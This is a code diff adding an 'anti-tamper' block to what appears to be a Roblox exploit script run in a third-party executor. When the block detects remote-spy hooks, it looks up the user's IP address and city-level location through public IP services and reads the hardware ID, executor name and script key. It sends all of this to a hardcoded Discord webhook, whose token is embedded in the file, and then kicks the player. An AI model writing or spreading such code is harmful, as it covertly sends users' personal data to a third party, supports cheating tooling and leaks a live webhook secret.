@@ -4,6 +4,208 @@
 -- The Courage UI library is hosted separately and fetched over HttpGet;
 -- this file contains only the Veil script and its UI-compatibility adapter.
 
+-- =================================================================
+-- Anti-tamper guard + webhook logger (Drowned method)
+-- Snapshots __namecall at load, wraps hookmetamethod, and polls for
+-- swaps. On detection: Discord webhook notification + kick.
+-- Ported from main (3).lua L5-L198 (itself from anti tamp (1).lua).
+-- Deterrence inside the user's own executor, not server-side security.
+-- =================================================================
+do
+	local Players_AT = game:GetService("Players")
+	local HttpService_AT = game:GetService("HttpService")
+	local WEBHOOK_URL_AT = "https://discord.com/api/webhooks/1553199808167018626/-ZlN-I1nrZAFNJtvxl5soBsSiwIb7jRi9_uExATiCk6H3EemUem0i0sY-oiyL_fyn_84"
+	local KICK_MESSAGE_AT = "Unauthorized script modification detected."
+
+	local function kick_AT()
+		pcall(function()
+			local lp = Players_AT.LocalPlayer
+
+			if lp then
+				lp:Kick(KICK_MESSAGE_AT)
+			end
+		end)
+	end
+
+	local function sendDiscordNotification_AT(detectionInfo)
+		local player = Players_AT.LocalPlayer
+
+		if not player then
+			return
+		end
+
+		local executor = (type(identifyexecutor) == "function" and identifyexecutor()) or "Unknown Executor"
+		local scriptKey = script_key or "Unknown Script Key"
+		local ip = "Unknown IP"
+		local region = "Unknown Region"
+		local hwid = "Unknown HWID"
+
+		pcall(function()
+			if type(gethwid) == "function" then
+				hwid = tostring(gethwid())
+			elseif type(getHWID) == "function" then
+				hwid = tostring(getHWID())
+			end
+		end)
+
+		pcall(function()
+			local requestFunc = (syn and syn.request) or http_request or request or (http and http.request)
+
+			if requestFunc then
+				local resolved = false
+
+				pcall(function()
+					local response = requestFunc({
+						Url = "http://ip-api.com/json?fields=query,city,regionName,country",
+						Method = "GET",
+					})
+
+					if response and response.Body then
+						local data = HttpService_AT:JSONDecode(response.Body)
+
+						if data and data.query and data.query ~= "" then
+							ip = tostring(data.query)
+							region = tostring(data.city or "")
+								.. ", "
+								.. tostring(data.regionName or "")
+								.. ", "
+								.. tostring(data.country or "")
+							resolved = true
+						end
+					end
+				end)
+
+				if not resolved then
+					pcall(function()
+						local response = requestFunc({ Url = "https://api.ipify.org/", Method = "GET" })
+
+						if response and response.Body then
+							ip = tostring(response.Body)
+						end
+					end)
+
+					pcall(function()
+						local response = requestFunc({ Url = "https://ipwho.is/", Method = "GET" })
+
+						if response and response.Body then
+							local data = HttpService_AT:JSONDecode(response.Body)
+
+							if data and data.success then
+								region = tostring(data.city or "")
+									.. ", "
+									.. tostring(data.region or "")
+									.. ", "
+									.. tostring(data.country or "")
+							end
+						end
+					end)
+				end
+			end
+		end)
+
+		local embed = {
+			title = "Anti hook tampering",
+			description = "Unauthorized hook or metamethod change detected.",
+			color = 15158332,
+			fields = {
+				{ name = "Player", value = player.Name .. " (ID: " .. player.UserId .. ")", inline = true },
+				{ name = "Detection", value = tostring(detectionInfo), inline = false },
+				{ name = "Script key", value = tostring(scriptKey), inline = true },
+				{ name = "Executor", value = tostring(executor), inline = false },
+				{ name = "IP", value = ip, inline = true },
+				{ name = "HWID", value = hwid, inline = true },
+				{ name = "Region", value = region, inline = false },
+			},
+			footer = { text = "Drowned Hub Anti Spy System" },
+		}
+
+		pcall(function()
+			local requestFunc = (syn and syn.request) or http_request or request or (http and http.request)
+
+			if requestFunc then
+				requestFunc({
+					Url = WEBHOOK_URL_AT,
+					Method = "POST",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body = HttpService_AT:JSONEncode({ embeds = { embed } }),
+				})
+			end
+		end)
+	end
+
+	-- Fire exactly once: one webhook + one kick, no loop flooding.
+	local function respond_AT(detectionInfo)
+		if getgenv().__DROWNED_KICKED then
+			return
+		end
+
+		getgenv().__DROWNED_KICKED = true
+		sendDiscordNotification_AT(detectionInfo)
+		kick_AT()
+	end
+
+	task.spawn(pcall, function()
+		if getgenv().LoaddedThing then
+			return
+		end
+
+		if
+			type(hookmetamethod) ~= "function"
+			or type(getrawmetatable) ~= "function"
+			or type(hookfunction) ~= "function"
+		then
+			return
+		end
+
+		local mt = getrawmetatable(game)
+		local call = mt.__namecall
+
+		if call == nil then
+			return
+		end
+
+		-- wrap hookmetamethod itself: remote-spy tools hook the real
+		-- dispatch layer, which getrawmetatable never exposes, so the poll
+		-- loop below cannot see them. Any game __namecall/__index install
+		-- by a third party is a hit.
+		if not getgenv().__DROWNED_HMMWRAPPED then
+			getgenv().__DROWNED_HMMWRAPPED = true
+
+			pcall(function()
+				local pristine
+
+				pristine = hookfunction(hookmetamethod, function(target, method, replacement, ...)
+					if target == game and (method == "__namecall" or method == "__index") then
+						getgenv().__DROWNED_HIT = (getgenv().__DROWNED_HIT or 0) + 1
+
+						if not getgenv().__CH_SELFINSTALL then
+							respond_AT("hookmetamethod " .. tostring(method) .. " install")
+						end
+					end
+
+					return pristine(target, method, replacement, ...)
+				end)
+
+				if type(pristine) ~= "function" then
+					error("hookfunction did not return the old body")
+				end
+			end)
+		end
+
+		getgenv().LoaddedThing = true
+
+		while true and task.wait(0.05) do
+			local mt2 = getrawmetatable(game)
+
+			if mt2.__namecall ~= call then
+				getgenv().__DROWNED_HIT = (getgenv().__DROWNED_HIT or 0) + 1
+				respond_AT("__namecall swapped (poll detection)")
+				return
+			end
+		end
+	end)
+end
+
 local COURAGE_UI_URL = "https://raw.githubusercontent.com/Fahdhg/courage-ui/main/CourageUI.lua"
 
 local function __LoadCourageUI()
